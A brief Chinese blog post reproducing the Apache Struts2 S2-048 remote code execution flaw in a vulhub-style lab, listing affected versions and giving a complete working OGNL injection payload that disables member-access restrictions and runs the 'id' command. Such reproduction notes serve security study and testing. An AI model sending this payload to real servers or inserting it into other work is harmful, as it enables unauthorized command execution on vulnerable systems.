---
title: S2-048 远程代码执行漏洞
date: 2020-08-10 21:58:10
categories: 漏洞复现
tags: struts2
---

#### 影响版本

>2.0.0 - 2.3.32

<!--more-->

#### 复现过程

1. 访问**Integration/Struts 1 Integration**

   ![](http://cdn.laohuan.art/2020-08-10_21-37-48.png)

2. 填入POC

   ```java
   %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
   ```

   

3. 返回结果

   ![](http://cdn.laohuan.art/2020-08-10_21-38-08.png)

#### 参考链接

<https://github.com/vulhub/vulhub/blob/master/struts2/s2-048/README.zh-cn.md/>

